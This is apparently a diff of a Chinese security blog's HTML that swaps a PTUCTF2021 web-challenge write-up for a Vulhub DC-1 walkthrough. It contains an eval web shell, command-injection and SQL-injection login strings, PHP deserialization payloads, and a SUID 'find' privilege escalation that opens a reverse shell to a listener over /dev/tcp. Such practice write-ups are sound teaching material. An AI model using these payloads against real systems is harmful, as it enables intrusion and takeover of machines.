+<p>Can you use this same method to find or access the flag in root?</p>
+<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>回到这题来，我们可以看到这里面要我们GET传参shell，然后执行shell的值，这边就涉及到另一个知识点——PHP中的命令执行<br><img src="https://img-blog.csdnimg.cn/5d5b2dfff8c6405aa56796a7a6aeb0f7.png" alt="在这里插入图片描述"><br>所以这题我们先令<strong>?shell=system(“ls”);</strong> 查看当前目录文件<br><img src="https://img-blog.csdnimg.cn/62ea1a86e7a44997b4001e20a8b61185.png" alt="在这里插入图片描述"></p>
-<p>再用<strong>?shell=system(“cat flag.php”);</strong>读取flag文件<br><img src="https://img-blog.csdnimg.cn/81c002efa0034dfd9c3e349e59cd0a8c.png" alt="在这里插入图片描述"><br>这边要注意的一个问题就是，用cat读取后的文件内容在源码中，而不是在网页上<br><img src="https://img-blog.csdnimg.cn/5572b587e8a947cab8191ab026b1fdb8.png" alt="在这里插入图片描述"></p>
-<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p><img src="https://img-blog.csdnimg.cn/aebcb85915104d8dbeec6137f90048a1.png" alt="在这里插入图片描述"><br>题目说得很清楚了，简单的文件包含，最简单的文件包含就是用filter协议读取，大家可以自行百度相关知识点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://img-blog.csdnimg.cn/d9b5f934c7a84fd18b41e9b788e37343.png" alt="在这里插入图片描述"><br>然后将得到的字符串进行base64解码即可<br><img src="https://img-blog.csdnimg.cn/a9fc76cc9c5b4669a4f5a718564f2d9e.png" alt="在这里插入图片描述"></p>
-<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p><img src="https://img-blog.csdnimg.cn/03d9b22bd0f54481a652f4436670b8de.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4a177e5942ba4c318f72482b7ad63491.png" alt="在这里插入图片描述"><br>这题是一句话木马的简单应用，其实和web9的做法差不多，直接POST传参linux命令即可<br><img src="https://img-blog.csdnimg.cn/a0814a0ed358434aa51c52d3261eee63.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4184ed75bce04fbb864c81bdc1784cc9.png" alt="在这里插入图片描述"><br>同样的，cat完在源码中查看flag<br><img src="https://img-blog.csdnimg.cn/411a76f2e1b04b3aa78378f9fc2badc9.png" alt="在这里插入图片描述"></p>
-<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><img src="https://img-blog.csdnimg.cn/283651d8d0f4465ab9a1d054d56ec832.png" alt="在这里插入图片描述"><br>这里考察的是万能密码的应用，具体原理可以去百度上查找<br><img src="https://img-blog.csdnimg.cn/d86b5d45d21641e48724b17117f01367.png" alt="在这里插入图片描述"><br>用户名为admin’ or 1=1#，密码随便输即可<br><img src="https://img-blog.csdnimg.cn/c09e7e86084d48b186d82dfeac29ae2c.png" alt="在这里插入图片描述"></p>
-<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img src="https://img-blog.csdnimg.cn/a73f43fe8396425ebc17b95b6b26c39a.png" alt="在这里插入图片描述"><br>题目中有个按钮，提示点击就能获得flag，但是点击不了，这时候我们可以自己修改源码，把按钮属性中的disable改成able，这样就能点击按钮获得flag了<br><img src="https://img-blog.csdnimg.cn/8d6d77b2569940ba9d42d3c0ac000d67.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6c995b9d651244fea2e8fc1700c42ffc.png" alt="在这里插入图片描述"></p>
-<h1 id="PTUCTF2021-你喜欢吃饼干吗"><a href="#PTUCTF2021-你喜欢吃饼干吗" class="headerlink" title="PTUCTF2021_你喜欢吃饼干吗"></a>PTUCTF2021_你喜欢吃饼干吗</h1><p>根据题目提示饼干，可以联想到cookie，在cookie中可以发现一串base64加密的字符串，解码即可得到flag<br><img src="https://img-blog.csdnimg.cn/3ba081118a6a470fbf079113f8eaae76.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/756384e9885f465ea9fe436ec13e2ee8.png" alt="在这里插入图片描述"></p>
-<h1 id="PTUCTF2021-我也曾经来过这里"><a href="#PTUCTF2021-我也曾经来过这里" class="headerlink" title="PTUCTF2021_我也曾经来过这里"></a>PTUCTF2021_我也曾经来过这里</h1><p>打开环境是一个404页面，但是仔细查看源码会发现，这是个假的404页面，注释中发现了另外的页面<br><img src="https://img-blog.csdnimg.cn/bb012c943cfb44a7858f42893dd41633.png" alt="在这里插入图片描述"><br>访问/404.html，发现是签到题的页面，但是禁用了右键，用F12或者CTRL+U查看源码，得到flag<br><img src="https://img-blog.csdnimg.cn/91e0190587ab4050b95f6688ae990217.png" alt="在这里插入图片描述"></p>
-<h1 id="PTUCTF2021-自己动手丰衣足食"><a href="#PTUCTF2021-自己动手丰衣足食" class="headerlink" title="PTUCTF2021_自己动手丰衣足食"></a>PTUCTF2021_自己动手丰衣足食</h1><p>进去后是一个flag提取器，随便拉一下然后抓个包可以发现，POST参数中可以控制数字的值，所以直接把bnVtYmVy的值改成1即可得到flag<br><img src="https://img-blog.csdnimg.cn/9dc9297bd34d4325b316a017a4defdd9.png" alt="在这里插入图片描述"></p>
-<h1 id="PTUCTF2021-又回到最初的起点"><a href="#PTUCTF2021-又回到最初的起点" class="headerlink" title="PTUCTF2021_又回到最初的起点"></a>PTUCTF2021_又回到最初的起点</h1><p>进入环境后提示flag在初始页面中，而PHP的初始页面为index.php，尝试访问index.php，发现又返回到了首页，这时候抓个包访问index.php，发现flag在协议头中<br><img src="https://img-blog.csdnimg.cn/98b8b9f78ad348b6a584cc5647a09a44.png" alt="在这里插入图片描述"></p>
-<p>后言：以上做法仅供参考，因为在实际做题过程中还发现了其他的做法，所以可以先按照自己的想法来做，掌握的方法越多越好。</p>
-<h1 id="PTUCTF2021-PHP是世界上最好的语言"><a href="#PTUCTF2021-PHP是世界上最好的语言" class="headerlink" title="PTUCTF2021_PHP是世界上最好的语言"></a>PTUCTF2021_PHP是世界上最好的语言</h1><p>进入环境后显示“秘密藏得更深了”，查看源码，发现<strong>sec3rt.php</strong></p>
-<p>访问/sec3rt.php，发现是一道PHP特性题，代码逻辑如下所示</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;	<span class="comment">// a和b必须都被设置并且不能为空，其中a为GET形式传入，b为POST形式传入，否则输出&quot;真相就在周围，但是你不配知道！&quot;</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$a</span>))&#123;      <span class="comment">// 如果传入的变量a中若含有数字，则直接输出&quot;你永远保守不了秘密！&quot;并且退出程序</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你永远保守不了秘密！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>===<span class="string">&quot;2021&quot;</span>)&#123;      <span class="comment">// 如果传入的变量b等于2021，则输出&quot;你永远也保守不了秘密！&quot;并且退出程序    PS：这里三个等号表示强类型比较，除了比较值，也比较类型</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你永远也保守不了秘密！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$a</span>) &amp;&amp; intval(<span class="variable">$b</span>,<span class="number">0</span>)===<span class="number">2021</span>)&#123;      <span class="comment">// 若传入的变量a的整数值非空，且传入的变量b的整数值等于2021，则输出flag</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;秘密已经泄露！&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;真相就在周围，但是你不配知道！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先是变量a，它不能为空的同时还不能含有数字，这时候就利用到了preg_match()函数的一个特性：<strong>无法处理数组</strong>，所以这边直接利用数组进行绕过</p>
+<h3 id="获得flag5"><a href="#获得flag5" class="headerlink" title="获得flag5"></a>获得flag5</h3><p>根据flag4的提示，需要进行提权，利用suid进行提权</p>
+<p>首先查看root权限执行的程序</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/bc7554dd8e974b15bf4ff7733d085d8f.png" alt="在这里插入图片描述"></p>
+<p>发现find有root权限，可以用其进行提权</p>
+<p>首先开启一个监听端口</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/0046cbf9cebc45e59292a26d2357b58f.png" alt="在这里插入图片描述"></p>
+<p>利用find进行提权并反弹到监听的端口上</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -<span class="built_in">exec</span> bash -ip &gt;&amp; /dev/tcp/192.168.80.128/7777 0&gt;&amp;1 \;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/27d74dcb82e74715b3864876271e9ac9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c643db417b1742dc89a19c5b6cfa4bc7.png" alt="在这里插入图片描述"></p>
+<p>进入/root，获得flag5</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/61dd94fbca774e3da45f9a6722f47471.png" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>GET：?a[]=1</p>
+<p>Well done!!!!</p>
+<p>Hopefully you’ve enjoyed this and learned some new skills.</p>
+<p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p>
 </blockquote>
-<p>接下来是变量b的绕过，涉及到的考点是intval()函数，这个函数在php特性题中很常见，应该重点掌握</p>
-<p><img src="https://img-blog.csdnimg.cn/c4f8df186ed24b7699de516f5e231f15.png" alt="在这里插入图片描述"></p>
-<p>这边需要注意的是，php默认传参类型为char类型，也就是字符类型，所以当我们直接POST传参b=2021的时候其实他传入的是b=”2021”，<strong>这时候就满足语句if($b===”2021”)</strong>的条件，所以我们可以通过添加前缀的办法来传入十六进制（0x前缀）或者八进制（0前缀）的数字来绕过</p>
-<blockquote>
-<p>2021的十六进制：0x7e5</p>
-<p>2021的八进制：0o3745</p>
-<p>最终payload：</p>
-<p>​    GET：?a[]=1</p>
-<p>​    POST：b=0x7e5（或者b=03745）</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/d42b2a15d4274014b1f96aff2c8a60d2.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e05783f11cf44761a6c746cc44519fb1.png" alt="在这里插入图片描述"></p>
-<h1 id="PTUCTF2021-拿来吧你"><a href="#PTUCTF2021-拿来吧你" class="headerlink" title="PTUCTF2021_拿来吧你"></a>PTUCTF2021_拿来吧你</h1><p>进入环境后是一个提交框，考察的是命令执行，输入<strong>ls</strong>，发现flag.php</p>
-<p><img src="https://img-blog.csdnimg.cn/a2a7c60a4d4444ec8467e9dff4a4b86c.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9CDU7ABS-1656174223531)(C:\MiGooli\HexoBlog\source\_posts\PTUCTF_WEB_Write Up.assets\image-20220625232253702.png)\]"></p>
-<p>然后输入<strong>cat flag.php</strong>，发现不能直接拿到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/53fd769f1e6c40a88cfa96586272b342.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cJ3ARbv3-1656174223531)(C:\MiGooli\HexoBlog\source\_posts\PTUCTF_WEB_Write Up.assets\image-20220625232320798.png)\]"></p>
-<p>这时候就要怀疑是不是对flag或者php这两个字符串进行了过滤，尝试用通配符”<strong>*</strong>“或者”<strong>?</strong>“进行绕过</p>
-<blockquote>
-<p>php通配符：可以用星号或者问号代替任意字符，例如可以用fla*代替flag，ph*代替php</p>
-</blockquote>
-<p>输入flag.ph*后似乎没有flag，查看源码后可以拿到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/7e1b9dabf2fd45fd81943c9e4d998aee.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-v9DiVhZA-1656174223532)(C:\MiGooli\HexoBlog\source\_posts\PTUCTF_WEB_Write Up.assets\image-20220625232632915.png)\]"></p>
-<h1 id="PTUCTF2021-我的丹尼尔呢"><a href="#PTUCTF2021-我的丹尼尔呢" class="headerlink" title="PTUCTF2021_我的丹尼尔呢"></a>PTUCTF2021_我的丹尼尔呢</h1><p>进入环境后在源码、cookie和协议头中都没找到有用信息，根据题目“丹尼尔”联想到机器人，访问/robots.txt，发现flag文件</p>
-<p><img src="https://img-blog.csdnimg.cn/c58818f13c1f41eab983c229fd0be3c4.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-uo7FAa87-1656174223532)(C:\MiGooli\HexoBlog\source\_posts\PTUCTF_WEB_Write Up.assets\image-20220626000033928.png)\]"></p>
-<blockquote>
-<p>丹尼尔是科幻作家艾萨克·阿西莫夫笔下的机器人，全名为机器人·丹尼尔·奥利瓦，在小说中丹尼尔为了人类的整体利益不断努力并守护了人类两万年</p>
-<p>丹尼尔只是一个小彩蛋，即使不知道他是机器人也无可厚非，因为robots.txt本身也是一个重要的协议文件，经常出现在web题中，扮演着提示的角色</p>
-</blockquote>
-<p>访问，在源码中找到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/946c5f28827944feaa75bc8062e3b0d3.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-DsbNuatL-1656174223534)(C:\MiGooli\HexoBlog\source\_posts\PTUCTF_WEB_Write Up.assets\image-20220626000108437.png)\]"></p>
-<h1 id="PTUCTF2021-了你了反"><a href="#PTUCTF2021-了你了反" class="headerlink" title="PTUCTF2021_了你了反"></a>PTUCTF2021_了你了反</h1><p>这题的考点是<strong>php反序列化</strong>，代码的总体流程如下：</p>
-<blockquote>
-<p>1、通过GET传参设置username和password两个变量的值</p>
-<p>2、通过cookie设置user这个类的值（这里设置的类型为class）</p>
-<p>3、检查设置的username和password是否与user类中的username和password的值相等，若相等则进入下一条语句</p>
-<p>4、检查变量isPTU是否为True，若为True，则进入下一条语句</p>
-<p>5、执行类的成员函数PTUGetFlag，首先检查isPTU的值是否为True，然后检查username和password的值是否相等，若两个条件都满足，则获得flag</p>
-</blockquote>
-<p>关于php反序列化可以多在百度上查找资料，首先要理解面向对象的设计思想，然后多了解php反序列漏洞的一些常见应用</p>
-<p>在这题我们可以修改PTUStu这个类中的username、password和isPTU这三个变量的值，尤其是isPTU修改为True，并且通过cookie传入给user类，然后通过GET传参设置username和password的值与user类中的值（也就是我们修改PTUStu类中的值）相等，从而利用反序列化漏洞拿到flag，poc如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PTUStu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;MiGooli&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;mkr&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isPTU</span>=<span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkStu</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isPTU;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PTUGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isPTU)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;非常棒！给你flag：&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你不是PTU的学生！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PTUStu()));</span><br></pre></td></tr></table></figure>
-<p>执行上面的poc，然后将结果写入cookie，同时GET传参相对应的username和password即可拿到flag</p>
-<blockquote>
-<p>payload：</p>
-<p>​    GET：?username=MiGooli&amp;password=mkr</p>
-<p>​    Cookie：user=O%3A6%3A%22PTUStu%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22MiGooli%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22mkr%22%3Bs%3A5%3A%22isPTU%22%3Bb%3A1%3B%7D</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/23f7cabcac534990b764dc0aec0ddeba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/83a425d24b32438e84d072351dab7df9.png" alt="在这里插入图片描述"></p>
 
       
 
@@ -377,6 +335,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透靶场</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -427,7 +396,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/11/29/PTUCTF_WEB_Write%20Up/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/08/17/Vulhub_DC-1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -441,18 +410,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/11/29/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ctfshow_web入门_文件包含
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/11/29/ctfshow_web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ctfshow_web入门_命令执行</div>
+    <a href="/2022/08/02/2022%E5%BC%BA%E7%BD%91%E6%9D%AFWP/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2022年强网杯WP</div>
       <i class="icon-circle-right"></i>
     </a>
   
